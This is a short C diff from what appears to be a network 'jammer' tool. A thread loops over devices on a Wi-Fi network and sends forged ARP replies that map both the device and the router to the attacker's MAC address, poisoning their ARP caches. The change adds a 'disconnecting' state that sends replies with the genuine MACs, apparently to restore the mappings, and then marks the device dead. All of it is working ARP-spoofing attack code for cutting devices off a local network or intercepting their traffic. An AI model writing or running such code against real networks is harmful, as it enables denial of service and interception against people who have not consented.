@@ -21,11 +21,21 @@ void *jam_jammed_devices(void *arg) {
 
         for (size_t i = 1; i < network->device_count; i++) {
             Device *device = &network->devices[i];
-            if (device->jamming) {
+            DeviceStatus status = device->status;
+            if (status == JAMMING) {
                 uint32_t device_ip = htonl(device->ip);
 
                 arp_send_reply(sockfd, "wlan0", my_mac, &device_ip, router->mac, &router_ip);
                 arp_send_reply(sockfd, "wlan0", my_mac, &router_ip, device->mac, &device_ip);
+            } else if (status == DISCONNECTING) {
+                uint32_t device_ip = htonl(device->ip);
+
+                arp_send_reply(sockfd, "wlan0", device->mac, &device_ip, router->mac, &router_ip);
+                arp_send_reply(sockfd, "wlan0", router->mac, &router_ip, device->mac, &device_ip);
+
+                if (device->disconnecting_counter++ > 3) {
+                    device->status = DEAD;
+                }
             }
         }
         pthread_mutex_unlock(&network->lock);
